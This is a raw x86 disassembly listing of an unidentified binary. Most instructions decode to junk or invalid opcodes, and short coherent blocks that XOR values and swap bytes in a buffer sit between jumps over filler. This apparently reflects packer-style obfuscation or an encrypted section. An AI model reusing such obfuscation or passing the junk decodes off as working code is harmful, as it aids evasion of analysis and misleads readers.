  404a01:	xchg   edi,eax
  404a02:	sbb    BYTE PTR [edi+eiz*1-0xb213bcf],ah
  404a09:	jmp    0x4049c8
  404a0b:	fnsave [ebp+ebp*8+0x730f323c]
  404a12:	xchg   edi,eax
  404a13:	pop    esp
  404a14:	stos   DWORD PTR es:[edi],eax
  404a15:	pop    eax
  404a16:	or     BYTE PTR [edx],0x33
  404a19:	lahf   
  404a1a:	arpl   WORD PTR [ecx-0x6a],si
  404a1d:	or     cl,BYTE PTR [ebx]
  404a1f:	mov    edi,0x2f999ba5
  404a24:	std    
  404a25:	(bad)  
  404a27:	stos   DWORD PTR es:[edi],eax
  404a28:	mov    cl,BYTE PTR [eax+0x72]
  404a2b:	inc    edi
  404a2c:	cmp    eax,0xe39db0b
  404a31:	jl     0x404a02
  404a33:	loopne 0x404a01
  404a35:	dec    eax
  404a36:	mov    eax,0x87edf3e9
  404a3b:	jge    0x404a41
  404a3d:	pop    ss
  404a3e:	push   ebp
  404a3f:	cmp    eax,DWORD PTR cs:[esi]
  404a42:	inc    ecx
  404a43:	scas   al,BYTE PTR es:[edi]
  404a44:	inc    esp
  404a45:	mov    bl,0x64
  404a47:	ret    0x58ac
  404a4a:	mov    ah,0xc5
  404a4c:	js     0x4049ee
  404a4e:	add    esi,ebp
  404a50:	in     al,dx
  404a51:	imul   edx,edi,0x4b
  404a54:	test   DWORD PTR [ebp+0x31],ecx
  404a57:	clc    
  404a58:	nop
  404a59:	aas    
  404a5a:	sbb    eax,0x509ef91f
  404a5f:	sub    BYTE PTR [eax+0x1afd5eb],bh
  404a65:	scas   al,BYTE PTR es:[edi]
  404a66:	jnp    0x404aae
  404a68:	ret    
  404a69:	loopne 0x404a08
  404a6b:	lahf   
  404a6c:	(bad)  
  404a6d:	mov    ebp,0xb4facb62
  404a72:	or     eax,DWORD PTR [eax]
  404a74:	mov    gs:0x94177023,eax
  404a7a:	xlat   BYTE PTR ds:[ebx]
  404a7b:	jl     0x404a1b
  404a7d:	xchg   ecx,eax
  404a7e:	mov    edx,0xd60ce55e
  404a83:	add    BYTE PTR [ecx+0x1860859b],bl
  404a89:	pop    esp
  404a8a:	aad    0x5
  404a8c:	test   DWORD PTR [edi-0x54cb6803],ecx
  404a92:	push   ebp
  404a93:	adc    bl,BYTE PTR cs:[edi+0x31]
  404a97:	das    
  404a98:	dec    sp
  404a9a:	mov    eax,ds:0x5612b72c
  404a9f:	mov    edx,0x790155ad
  404aa4:	clc    
  404aa5:	sbb    eax,0x32f445c7
  404aaa:	test   DWORD PTR [eax+edi*8+0x33bc45c7],ebx
  404ab1:	test   DWORD PTR [eax+edi*8+0x33e8558b],ebx
  404ab8:	rol    BYTE PTR [ebx],1
  404aba:	shr    ecx,1
  404abc:	imul   eax,DWORD PTR [ebx],0x0
  404abf:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x883c6a28
  404b32:	mov    eax,ds:0x22a22feb
  404b37:	jle    0x404bb7
  404b39:	pop    eax
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b6f
  404b3e:	adc    eax,0xa32b084a
  404b43:	sar    dl,1
  404b45:	mov    ds:0xccc3b66,al
  404b4a:	adc    esi,esi
  404b4c:	ret    0x61c5
  404b4f:	xlat   BYTE PTR es:[ebx]
  404b51:	xchg   ecx,eax
  404b52:	es pop ebx
  404b54:	int3   
  404b55:	mov    WORD PTR [esi+0x7017ecfa],?
  404b5b:	or     eax,DWORD PTR [ecx]
  404b5d:	lods   eax,DWORD PTR ds:[esi]
  404b5e:	popa   
  404b5f:	lods   al,BYTE PTR ds:[esi]
  404b60:	mov    dl,0x73
  404b62:	mov    cl,0xa6
  404b64:	push   ecx
  404b65:	pop    esi
  404b66:	(bad)  
  404b67:	psllq  mm7,QWORD PTR [ecx]
  404b6a:	test   al,0x41
  404b6c:	stos   DWORD PTR es:[edi],eax
  404b6d:	rcl    DWORD PTR [edi+eiz*8+0x4bc2e6e0],cl
  404b74:	cdq    
  404b75:	mov    bl,0xcb
  404b77:	enter  0xabd4,0x92
  404b7b:	mov    ds:0xfed6f467,al
  404b80:	jbe    0x404b4d
  404b82:	sub    ebp,eax
  404b84:	mov    dl,0xce
  404b86:	out    dx,eax
  404b87:	add    al,0xda
  404b89:	jo     0x404b21
  404b8b:	add    BYTE PTR ds:0x6bcbfdf2,0x39
  404b92:	mov    eax,ds:0x869b7122
  404b97:	(bad)  
  404b98:	gs hlt 
  404b9a:	jp     0x404b9e
  404b9c:	cld    
  404b9d:	imul   esi,DWORD PTR [esi+esi*8+0x5a],0xffffff8f
  404ba2:	aad    0xbe
  404ba4:	cmp    esi,DWORD PTR [ecx-0x1a]
  404ba7:	cmc    
  404ba8:	outs   dx,BYTE PTR ds:[esi]
  404ba9:	(bad)  [ebp-0x4c64c4a6]
  404baf:	fcomp  st(6)
  404bb1:	test   BYTE PTR [ebx+ebx*4-0x2f],ah
  404bb5:	int    0x98
  404bb7:	dec    BYTE PTR ds:0x266ad32d
  404bbd:	dec    ebp
  404bbe:	(bad)  [ebp+0x415fd33a]
  404bc4:	xlat   BYTE PTR ds:[ebx]
  404bc5:	mov    BYTE PTR [edx-0x29a5548c],dh
  404bcb:	inc    esi
  404bcc:	cdq    
  404bcd:	jne    0x404b6d
  404bcf:	(bad)  
  404bd0:	call   0xc5a1b606
  404bd5:	mov    al,ds:0x2909ced6
  404bda:	(bad)  
  404bdb:	fist   WORD PTR [edi]
  404bdd:	xor    esp,0x4c
  404be0:	sbb    eax,0x1ef4c2bb
  404be5:	call   FWORD PTR [esi-0x50c54c6c]
  404beb:	jle    0x404c31
  404bed:	sub    BYTE PTR [eax],ah
  404bef:	dec    eax
  404bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bf1:	mov    al,ds:0xc4e75ecf
  404bf6:	jmp    0x4216:0x62b5621b
  404bfd:	aam    0x3a
  404bff:	ret    
  404c00:	data16 cmp dl,BYTE PTR [ebx+0x73]
  404c04:	mov    ah,0x3a
  404c06:	inc    eax
  404c07:	push   0xe2092781
  404c0c:	add    dl,0x33
  404c0f:	scas   eax,DWORD PTR es:[edi]
  404c10:	int3   
  404c11:	adc    BYTE PTR ds:0xfd78ff71,al
  404c17:	ins    BYTE PTR es:[edi],dx
  404c18:	sub    al,0x2a
  404c1a:	stos   DWORD PTR es:[edi],eax
  404c1b:	push   0xffe7723
  404c20:	retf   
  404c21:	mov    ds:0xaf1e7f0f,al
  404c26:	shr    BYTE PTR [eax],0x7f
  404c29:	and    BYTE PTR [ecx],al
  404c2b:	cwde   
  404c2c:	imul   ecx,edx,0x6ae73c63
  404c32:	cmp    DWORD PTR [ebx+eiz*8+0x4f],ebp
  404c36:	rcl    BYTE PTR [eax],cl
  404c38:	cs xor eax,0x5b6bc213
  404c3e:	or     esi,eax
  404c40:	xchg   ebp,eax
  404c41:	clc    
  404c42:	rcl    cl,0xb8
  404c45:	fs jge 0x404c6f
  404c48:	mov    cl,0x97
  404c4a:	jp     0x404c69
  404c4c:	pop    ebx
  404c4d:	dec    ebp
  404c4e:	retf   
  404c4f:	adc    DWORD PTR [edi-0x8],esp
  404c52:	ja     0x404cc0
  404c54:	out    dx,eax
  404c55:	imul   esp,DWORD PTR [esi-0x2860f463],0x7828d06d
  404c5f:	loopne 0x404c2d
  404c61:	scas   al,BYTE PTR es:[edi]
  404c62:	mov    ds:0x1d69c468,al
  404c67:	jle    0x404bf2
  404c69:	jp     0x404c77
  404c6b:	clc    
  404c6c:	lods   al,BYTE PTR ds:[esi]
  404c6d:	inc    ebp
  404c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c6f:	sbb    BYTE PTR [esi],cl
  404c71:	mov    ebx,0xb059d2f
  404c76:	jmp    FWORD PTR [ecx+0x18a16ecb]
  404c7c:	adc    BYTE PTR [edi],ch
  404c7e:	xor    eax,0x6a45ec11
  404c83:	in     al,0xd5
  404c85:	addr16 pop ds
  404c87:	mov    ds:0x6fef6e7a,al
  404c8c:	sbb    al,0xc8
  404c8e:	outs   dx,BYTE PTR ds:[esi]
  404c8f:	dec    esi
  404c90:	jb     0x404c6c
  404c92:	xor    BYTE PTR [eax+edx*4],ch
  404c95:	inc    edx
  404c96:	dec    edx
  404c97:	add    dl,BYTE PTR [ebx]
  404c99:	pop    edi
  404c9a:	jnp    0x404c1c
  404c9c:	fsub   st,st(6)
  404c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c9f:	cdq    
  404ca0:	xor    ah,dh
  404ca2:	cmp    ah,BYTE PTR [esp+eiz*2+0x64]
  404ca6:	sub    edx,ecx
  404ca8:	inc    edi
  404ca9:	mov    edi,esp
  404cab:	pusha  
  404cac:	test   BYTE PTR [ebx-0x51e70b8e],0x9a
  404cb3:	dec    ebp
  404cb4:	sub    ah,bl
  404cb6:	mov    esp,0xec6192e7
  404cbb:	(bad)  
  404cbc:	std    
  404cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cbe:	inc    ebx
  404cbf:	imul   edi,DWORD PTR [ebx-0x7],0xecaa32b7
  404cc6:	arpl   WORD PTR [esi+0x6a2196b],bp
  404ccc:	mov    ebx,0x6bb90dc7
  404cd1:	(bad)  
  404cd2:	xchg   edx,eax
  404cd3:	push   0xf2883db9
  404cd8:	inc    edx
  404cd9:	push   ds
  404cda:	retf   0xb1f0
  404cdd:	adc    BYTE PTR [esi-0x5d587fd5],ah
  404ce3:	jle    0x404d18
  404ce5:	mov    edx,0x81dc8214
  404cea:	retf   
  404ceb:	pop    edi
  404cec:	mov    al,0x48
  404cee:	pop    ebx
  404cef:	popa   
  404cf0:	test   BYTE PTR [edi],bh
  404cf2:	add    ch,BYTE PTR [ecx+edx*8+0x78346a88]
  404cf9:	iret   
  404cfa:	inc    esi
  404cfb:	mov    ds:0xc613c5ff,al
  404d00:	mov    dh,0xfe
  404d02:	cmp    eax,eax
  404d04:	(bad)  
  404d05:	les    ebx,FWORD PTR [eax+0xe58b44f]
  404d0b:	mov    ebx,0xbe44e5f0
  404d10:	shr    DWORD PTR [esi],1
  404d12:	clc    
  404d13:	mov    edx,0x6f4d36f1
  404d18:	rcr    BYTE PTR [eax+0x62356939],1
  404d1e:	sub    DWORD PTR [edx+0x9f8dae5],ebp
  404d24:	ror    DWORD PTR [ebx-0x51],1
  404d27:	sub    ebp,edx
  404d29:	inc    ebx
  404d2a:	mov    dl,al
  404d2c:	dec    edx
  404d2d:	ss dec ecx
  404d2f:	es sti 
  404d31:	stos   BYTE PTR es:[edi],al
  404d32:	mov    edi,0x1c31e7ec
  404d37:	ins    BYTE PTR es:[edi],dx
  404d38:	jb     0x404dab
  404d3a:	dec    ecx
  404d3b:	call   0x2475:0x9e705c3f
  404d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d43:	mov    WORD PTR [ebp+0xa],ss
  404d46:	mov    dh,0xc
  404d48:	imul   BYTE PTR [edi-0x46]
  404d4b:	iret   
  404d4c:	mov    cl,0x8d
  404d4e:	lock pop ecx
  404d50:	xor    dl,dl
  404d52:	leave  
  404d53:	fmulp  st(5),st
  404d55:	in     al,dx
  404d56:	fadd   QWORD PTR [ecx+0x7d]
  404d59:	push   ecx
  404d5a:	das    
  404d5b:	not    ch
  404d5d:	inc    edi
  404d5e:	mov    ebx,0x3bb3f7c5
  404d63:	pop    ds
  404d64:	into   
  404d65:	cli    
  404d66:	push   0xbd601396
  404d6b:	fwait
  404d6c:	outs   dx,DWORD PTR ds:[esi]
  404d6d:	lahf   
  404d6e:	sti    
  404d6f:	bswap  ecx
  404d71:	jae    0x404d28
  404d73:	jnp    0x404d47
  404d75:	jns    0x404dd1
  404d77:	mov    al,0xe8
  404d79:	add    al,0xf7
  404d7b:	mov    eax,0xc3d73bf8
  404d80:	xchg   ecx,eax
  404d81:	inc    edi
  404d82:	call   ebp
  404d84:	xlat   BYTE PTR ds:[ebx]
  404d85:	lods   al,BYTE PTR ds:[esi]
  404d86:	pusha  
  404d87:	add    al,0x84
  404d89:	mov    ecx,0xfbcdd1a8
  404d8e:	dec    ebx
  404d8f:	arpl   WORD PTR [eax+0xa],ax
  404d92:	ja     0x404dc2
  404d94:	shr    ebp,cl
  404d96:	(bad)  
  404d97:	sahf   
  404d98:	xchg   ebp,eax
  404d99:	jge    0x404def
  404d9b:	scas   eax,DWORD PTR es:[edi]
  404d9c:	into   
  404d9d:	shr    BYTE PTR [ebp-0x6075207e],0x85
  404da4:	pop    ss
  404da5:	adc    edx,DWORD PTR [ecx+eax*4+0x6f]
  404da9:	cwde   
  404daa:	fmul   st,st(0)
  404dac:	sub    ah,BYTE PTR [eax]
  404dae:	mov    ebx,0x1bec5a2a
  404db3:	sub    ah,bh
  404db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404db6:	xor    BYTE PTR [eax+0x7a08e413],0x82
  404dbd:	and    BYTE PTR [ebp+0x7f],al
  404dc0:	sub    eax,0x7415a8cc
  404dc5:	pop    edi
  404dc6:	loope  0x404d66
  404dc8:	outs   dx,BYTE PTR ds:[esi]
  404dc9:	push   es
  404dca:	test   DWORD PTR [esi],edx
  404dcc:	and    eax,0x3aaf9644
  404dd1:	mov    bh,0x18
  404dd3:	imul   ecx,DWORD PTR [ebp-0x14],0xffffffd1
  404dd7:	add    DWORD PTR [esi+esi*4-0x6a94b6e],ebp
  404dde:	dec    esi
  404ddf:	push   ebx
  404de0:	aaa    
  404de1:	xchg   BYTE PTR ds:[edi+0x29a0105e],cl
  404de8:	pop    esp
  404de9:	sub    eax,esp
  404deb:	lods   eax,DWORD PTR ds:[esi]
  404dec:	mov    al,0x71
  404dee:	pop    ecx
  404def:	mov    esi,0xb4364736
  404df4:	cs pushf 
  404df6:	add    BYTE PTR [eax-0x65e6855],bh
  404dfc:	popa   
  404dfd:	iret   
  404dfe:	sbb    eax,0xa941cc9a
  404e03:	add    ebx,esp
  404e05:	lahf   
  404e06:	xor    DWORD PTR [ebx],ebp
  404e08:	sar    BYTE PTR [ebx],cl
  404e0a:	inc    eax
  404e0b:	adc    dh,BYTE PTR [ebx-0x6b]
  404e0e:	xchg   esi,eax
  404e0f:	(bad)  
  404e10:	push   eax
  404e11:	arpl   bp,di
  404e13:	mov    ebp,0xdbe6435e
  404e18:	shl    DWORD PTR [eax-0x7b61637],0x50
  404e1f:	add    eax,DWORD PTR [ecx]
  404e21:	nop
  404e22:	fild   WORD PTR [ebx]
  404e24:	stc    
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e73
  404e5e:	mov    esp,0x218c3576
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e05
  404e6a:	dec    ebp
  404e6b:	or     eax,0xe707501d
  404e70:	stos   BYTE PTR es:[edi],al
  404e71:	pop    ds
  404e72:	aam    0x43
  404e74:	push   esi
  404e75:	jp     0x404e14
  404e77:	xor    dh,BYTE PTR [edx]
  404e79:	push   edx
  404e7a:	loop   0x404ede
  404e7c:	push   esp
  404e7d:	in     al,0x32
  404e7f:	xor    al,0xf0
  404e81:	int    0x3c
  404e83:	fcomp  QWORD PTR [bp+si+0x24b9]
  404e88:	aaa    
  404e89:	inc    eax
  404e8a:	jmp    0x404e72
  404e8c:	das    
  404e8d:	sbb    eax,0xb7faad1b
  404e92:	call   0xf3f175f4
  404e97:	pop    ds
  404e98:	in     al,0x60
  404e9a:	jb     0x404e1f
  404e9c:	adc    dh,BYTE PTR [ebp+0x65]
  404e9f:	(bad)  
  404ea0:	mov    ch,0xea
  404ea2:	in     eax,0x32
  404ea4:	mov    ds,WORD PTR [ecx+esi*4-0x9aca18f]
  404eab:	add    esi,DWORD PTR [edx]
  404ead:	retf   
  404eae:	in     al,dx
  404eaf:	cld    
  404eb0:	rcr    DWORD PTR [ebx+0x1e9548a1],0x57
  404eb7:	ret    0xb7f3
  404eba:	and    al,0x2f
  404ebc:	or     eax,esi
  404ebe:	inc    esi
  404ebf:	or     BYTE PTR [ebp+ebx*1+0xf],ch
  404ec3:	je     0x404e8a
  404ec5:	mov    WORD PTR [esi+0x16417fa3],gs
  404ecb:	push   edx
  404ecc:	jge    0x404f3e
  404ece:	add    al,0x98
  404ed0:	lock pop edi
  404ed2:	adc    eax,0x28a8dc8b
  404ed7:	mov    ah,BYTE PTR [esi+ebx*2+0x3c]
  404edb:	push   es
  404edc:	jmp    0xd895f006
  404ee1:	popf   
  404ee2:	test   eax,0xb6ebe89
  404ee7:	jl     0x404eb8
  404ee9:	stos   BYTE PTR es:[edi],al
  404eea:	push   ebp
  404eeb:	mov    edx,0x3ba571a4
  404ef0:	add    ebx,DWORD PTR [ecx]
  404ef2:	mov    al,0xdf
  404ef4:	lods   eax,DWORD PTR ds:[esi]
  404ef5:	stos   DWORD PTR es:[edi],eax
  404ef6:	inc    edx
  404ef7:	inc    esi
  404ef8:	push   cs
  404ef9:	adc    eax,0x657e9ec3
  404efe:	sub    al,0x8f
  404f00:	or     BYTE PTR [ebx+0x69],dl
  404f03:	or     eax,0xf369b615
  404f08:	bound  ebx,QWORD PTR [ebx-0x3d05f62b]
  404f0e:	call   0x29f4:0x27f6a776
  404f15:	idiv   al
  404f17:	fld    QWORD PTR [edx-0x2b]
  404f1a:	(bad)  [edx+ebx*8-0x71]
  404f1e:	adc    al,0x1a
  404f21:	push   ebp
  404f22:	and    ah,BYTE PTR [ecx]
  404f24:	loope  0x404f79
  404f26:	sti    
  404f27:	ret    
  404f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f29:	sub    BYTE PTR [edi-0x13b340ec],cl
  404f2f:	(bad)  
  404f30:	pop    edx
  404f31:	test   BYTE PTR [ecx],0x92
  404f34:	int    0x9e
  404f36:	test   al,0xd0
  404f38:	(bad)  
  404f39:	push   ebp
  404f3a:	adc    BYTE PTR [edx-0x2fe54e53],0x29
  404f41:	popf   
  404f42:	xlat   BYTE PTR ds:[ebx]
  404f43:	in     al,0x9
  404f45:	popa   
  404f46:	xchg   edi,eax
  404f47:	popf   
  404f48:	jmp    0x404ee7
  404f4a:	dec    ecx
  404f4b:	pusha  
  404f4c:	add    dl,0x79
  404f4f:	xlat   BYTE PTR ds:[ebx]
  404f50:	push   eax
  404f51:	ret    
  404f52:	pop    esp
  404f53:	mov    ch,0x22
  404f55:	xor    BYTE PTR [eax+eax*1],ah
  404f58:	xchg   esi,eax
  404f59:	test   edi,0x3e3fac06
  404f5f:	in     al,dx
  404f60:	xchg   edi,eax
  404f61:	rcr    BYTE PTR [ebx-0x10],cl
  404f64:	(bad)  
  404f65:	sbb    ebx,DWORD PTR [eax]
  404f67:	push   ecx
  404f68:	push   edi
  404f69:	ror    ebp,0x35
  404f6c:	hlt    
  404f6d:	sbb    BYTE PTR [ecx+0x6b066515],ch
  404f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f74:	scas   eax,DWORD PTR es:[edi]
  404f75:	xor    al,0xd3
  404f77:	shl    ch,0xd3
  404f7a:	aaa    
  404f7b:	mov    cl,0x49
  404f7d:	push   ebp
  404f7e:	cs scas eax,DWORD PTR es:[edi]
  404f80:	call   0x5408:0xded05c23
  404f87:	mov    dh,0xdd
  404f89:	push   esi
  404f8a:	mov    eax,0x3c60be68
  404f8f:	out    0x17,eax
  404f91:	jb     0x404fb2
  404f93:	cli    
  404f94:	mov    ebp,0x42169626
  404f99:	add    al,0xad
  404f9b:	dec    esi
  404f9c:	js     0x404f94
  404f9e:	inc    esi
  404f9f:	push   esi
  404fa0:	icebp  
  404fa1:	add    al,0xe3
  404fa3:	test   DWORD PTR [ebx+esi*4+0x5d],ebx
  404fa7:	stc    
  404fa8:	scas   eax,DWORD PTR es:[edi]
  404fa9:	or     dh,cl
  404fab:	pop    eax
  404fac:	popf   
  404fad:	sub    esi,ebx
  404faf:	mov    ecx,0xa0ec74d4
  404fb4:	or     dl,BYTE PTR [esi-0x7a1ef0f9]
  404fba:	mov    al,0x7b
  404fbc:	lods   al,BYTE PTR ds:[esi]
  404fbd:	inc    esp
  404fbe:	xchg   esp,eax
  404fbf:	adc    eax,DWORD PTR [ecx*8-0x3c816476]
  404fc6:	xor    esp,DWORD PTR [edx-0x1]
  404fc9:	sub    esp,DWORD PTR [edi]
  404fcb:	bound  eax,QWORD PTR [ecx+0x61acaf39]
  404fd1:	jae    0x40504c
  404fd3:	inc    edi
  404fd4:	in     eax,dx
  404fd5:	add    al,0xc4
  404fd7:	inc    edi
  404fd8:	es stos DWORD PTR es:[edi],eax
  404fda:	sbb    BYTE PTR [esp-0xbce3b7c],0x68
  404fe2:	cmp    ecx,DWORD PTR [ecx-0x7d]
  404fe5:	fnsave [edi]
  404fe7:	repz jge 0x405021
  404fea:	outs   dx,DWORD PTR ds:[esi]
  404feb:	sbb    eax,0x4c566f76
  404ff0:	imul   ecx,DWORD PTR [ebx],0xffffffa1
  404ff3:	mov    al,ds:0x561042bf
  404ff8:	jecxz  0x404f9d
  404ffa:	inc    ebx
  404ffb:	cmp    ah,BYTE PTR [edx-0x1e3678c8]
  405001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405002:	push   esp
  405003:	jl     0x405045
  405005:	xor    dh,BYTE PTR [ebx+0x2d71b2a0]
  40500b:	test   DWORD PTR [eax+0x2b5b0775],ebx
  405011:	cmp    dl,BYTE PTR [edx-0x1a073410]
  405017:	je     0x405003
  405019:	add    ebp,edi
  40501b:	push   ecx
  40501c:	push   esp
  40501d:	xchg   ecx,eax
  40501e:	daa    
  40501f:	cli    
  405020:	out    dx,eax
  405021:	shl    DWORD PTR [edi],cl
  405023:	sahf   
  405024:	mov    al,0x74
  405026:	dec    esp
  405027:	nop
  405028:	mov    ah,ah
  40502a:	aas    
  40502b:	xor    eax,0x4e46de41
  405030:	cmp    ecx,DWORD PTR [edx-0x4bf27e35]
  405036:	xchg   esp,eax
  405037:	push   ebp
  405038:	jle    0x405064
  40503a:	fbstp  TBYTE PTR [eax]
  40503c:	and    eax,0x89dc8494
  405041:	pop    esi
  405042:	cld    
  405043:	jmp    0xa1be68cc
  405048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405049:	ss jae 0x404ff8
  40504c:	outs   dx,BYTE PTR ds:[esi]
  40504d:	push   ss
  40504e:	dec    ecx
  40504f:	call   0x89e5:0x7e2693fe
  405056:	adc    DWORD PTR [ecx+0x4171d342],esp
  40505c:	xchg   ebp,eax
  40505d:	or     DWORD PTR [ecx],ebx
  40505f:	adc    cl,cl
  405061:	dec    ecx
  405062:	gs cmp al,0xae
  405065:	push   ecx
  405066:	mov    ds:0x74d309a4,eax
  40506b:	mov    BYTE PTR [edx],dl
  40506d:	jae    0x4050cb
  40506f:	jle    0x40509c
  405071:	leave  
  405072:	out    0x9e,eax
  405074:	and    DWORD PTR [ebp+0x78af0bda],edi
  40507a:	dec    ebp
  40507b:	loop   0x405057
  40507d:	stos   BYTE PTR es:[edi],al
  40507e:	push   edi
  40507f:	mov    ebp,ebp
  405081:	or     dl,BYTE PTR [ebx+0xaedbc74]
  405087:	popf   
  405088:	sbb    DWORD PTR [ecx],ebp
  40508a:	pop    eax
  40508b:	dec    ecx
  40508c:	fisttp QWORD PTR [ebp+0x2fcadfe]
  405092:	clc    
  405093:	outs   dx,DWORD PTR ds:[esi]
  405094:	mov    BYTE PTR [edx+esi*8+0xb],0xa6
  405099:	jnp    0x40504b
  40509b:	cmp    BYTE PTR [esi+ecx*8],cl
  40509e:	xchg   BYTE PTR ds:0x30a3bc3e,bl
  4050a4:	test   DWORD PTR [ebx+0x1d45873],eax
  4050aa:	stos   BYTE PTR es:[edi],al
  4050ab:	mov    edi,0x3c939357
  4050b0:	shr    dh,cl
  4050b2:	cmp    al,0x8b
  4050b4:	loope  0x405067
  4050b6:	cli    
  4050b7:	sub    DWORD PTR [ebx-0x2bfe8d63],0xd1784009
  4050c1:	adc    BYTE PTR [eax-0x598cf842],ch
  4050c7:	adc    BYTE PTR [esi+0x69],cl
  4050ca:	out    0x9e,eax
  4050cc:	push   ecx
  4050cd:	jbe    0x40511e
  4050cf:	sbb    ch,BYTE PTR [edi-0x5d]
  4050d2:	pop    esp
  4050d3:	push   es
  4050d4:	cld    
  4050d5:	dec    esi
  4050d6:	(bad)  
  4050d7:	call   0x6939ae1c
  4050dc:	aas    
  4050dd:	stos   BYTE PTR es:[di],al
  4050df:	ret    0xc911
  4050e2:	lea    ecx,[ecx+edx*4+0xf935cc5]
  4050e9:	or     edx,esi
  4050eb:	xor    al,0x20
  4050ed:	pop    ds
  4050ee:	retf   0xaa91
  4050f1:	fild   DWORD PTR [ecx+eiz*4-0x1a320588]
  4050f8:	add    BYTE PTR [edi],0x47
  4050fb:	mul    BYTE PTR [esi]
  4050fd:	pop    esi
  4050fe:	leave  
  4050ff:	out    0x5f,eax
  405101:	idiv   bl
  405103:	popa   
  405104:	add    eax,DWORD PTR [edi]
  405106:	lahf   
  405107:	sbb    eax,0xc8b5c4e0
  40510c:	jbe    0x4050ff
  40510e:	cs retf 0x37d4
  405112:	cmp    eax,0x62187b69
  405117:	sbb    eax,0x440d4054
  40511c:	imul   edi,edx,0xa6c793d9
  405122:	pop    edx
  405123:	cld    
  405124:	jp     0x40511f
  405126:	and    BYTE PTR [esi+0x5b720ae7],bl
  40512c:	in     al,0xa3
  40512e:	loopne 0x405141
  405130:	lahf   
  405131:	outs   dx,DWORD PTR ds:[esi]
  405132:	xchg   esi,eax
  405133:	std    
  405134:	or     eax,0x69281621
  405139:	mov    edx,esp
  40513b:	and    al,0xef
  40513d:	daa    
  40513e:	mov    DWORD PTR [ecx+0x69ff44f9],edi
  405144:	adc    bh,BYTE PTR [ebx-0x3b]
  405147:	sbb    BYTE PTR [ebx-0x2],al
  40514a:	jae    0x40517d
  40514c:	ins    BYTE PTR es:[edi],dx
  40514d:	sbb    BYTE PTR [esi],0xf
  405150:	scas   eax,DWORD PTR es:[edi]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	pusha  
  405172:	std    
  405173:	je     0x405174
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x40513d
  40517e:	enter  0xb706,0x26
  405182:	adc    ebp,DWORD PTR [ebx+eax*1-0x78]
  405186:	pop    ss
  405187:	test   al,0x98
  405189:	pop    edi
  40518a:	rcr    BYTE PTR [edx-0x4a261c0f],cl
  405190:	mov    eax,ds:0xac73cdfe
  405195:	cmp    DWORD PTR ds:0x2f338931,edi
  40519b:	xchg   esi,eax
  40519c:	jmp    0x40518a
  40519e:	or     al,BYTE PTR ds:0x50d21f21
  4051a4:	inc    esp
  4051a5:	outs   dx,BYTE PTR ds:[esi]
  4051a6:	stos   BYTE PTR es:[edi],al
  4051a7:	add    ebx,eax
  4051a9:	imul   ebp,DWORD PTR [edx+0x12],0xc6f720c8
  4051b0:	(bad)  
